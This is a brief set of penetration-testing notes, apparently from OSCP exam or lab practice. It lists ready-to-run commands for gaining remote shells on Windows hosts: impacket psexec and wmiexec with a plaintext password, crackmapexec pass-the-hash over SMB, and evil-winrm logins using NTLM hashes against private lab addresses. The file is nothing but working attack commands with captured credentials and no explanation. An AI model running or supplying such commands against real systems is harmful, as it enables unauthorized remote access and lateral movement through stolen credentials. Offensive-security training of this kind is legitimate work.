impacket-psexec web_svc:Diamond1@192.168.197.147

impacket-wmiexec web_svc:Diamond1@192.168.197.147

 crackmapexec smb 10.10.132.142 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
 crackmapexec smb 10.10.132.140 -u oscp.exam\tom_admin -H 31d6cfe0d16ae931b73c59d7e0c089c0

impacket-psexec -hashes 00000000000000000000000000000000:e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.132.142
 impacket-wmiexec -hashes 00000000000000000000000000000000:e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.132.142
evil-winrm -i 10.10.132.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd


